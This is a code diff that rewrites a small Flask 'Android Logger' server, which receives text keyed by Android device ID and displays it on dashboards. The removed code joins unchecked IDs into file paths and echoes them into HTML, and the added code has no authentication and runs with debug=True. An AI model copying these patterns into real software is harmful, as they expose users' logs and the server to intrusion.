@@ -1,61 +1,29 @@
-from flask import Flask, request, render_template, redirect
-import os
-from datetime import datetime
+from flask import Flask, request, render_template
+from collections import defaultdict
 
 app = Flask(__name__)
 
-LOG_DIR = "user_logs"
-os.makedirs(LOG_DIR, exist_ok=True)
+# Store logs per android_id in memory (temporary)
+logs = defaultdict(list)
 
 @app.route('/')
 def index():
-    return "Android Logger Server is Running."
+    return render_template('index.html')
 
-@app.route('/upload', methods=['POST'])
-def upload():
-    data = request.get_json()
-    device_id = data.get("device_id")
-    log_data = data.get("log")
+@app.route('/dashboard/<android_id>')
+def dashboard(android_id):
+    user_logs = logs.get(android_id, [])
+    return render_template('dashboard.html', android_id=android_id, logs=user_logs)
 
-    if not device_id or not log_data:
-        return {"status": "error", "message": "Missing device_id or log"}, 400
+@app.route('/log', methods=['POST'])
+def log():
+    android_id = request.form.get('android_id')
+    text = request.form.get('text')
 
-    user_folder = os.path.join(LOG_DIR, device_id)
-    os.makedirs(user_folder, exist_ok=True)
+    if android_id and text:
+        logs[android_id].append(text)
+        return "Log received", 200
+    return "Missing fields", 400
 
-    filename = datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
-    filepath = os.path.join(user_folder, filename)
-
-    with open(filepath, "w") as f:
-        f.write(log_data)
-
-    return {"status": "success"}
-
-@app.route('/dashboard')
-def dashboard_redirect():
-    return redirect('/dashboard/input')
-
-@app.route('/dashboard/input')
-def dashboard_input():
-    return '''
-    <form action="/dashboard/view" method="get">
-        <label>Enter Android ID:</label>
-        <input type="text" name="device_id" />
-        <input type="submit" value="View Logs" />
-    </form>
-    '''
-
-@app.route('/dashboard/view')
-def dashboard_view():
-    device_id = request.args.get('device_id')
-    log_folder = os.path.join(LOG_DIR, device_id)
-    
-    if not os.path.exists(log_folder):
-        return f"<h2>No logs found for device ID: {device_id}</h2>"
-
-    logs = []
-    for filename in sorted(os.listdir(log_folder), reverse=True):
-        with open(os.path.join(log_folder, filename)) as f:
-            logs.append((filename, f.read()))
-
-    return render_template("dashboard.html", device_id=device_id, logs=logs)
+if __name__ == "__main__":
+    app.run(debug=True)
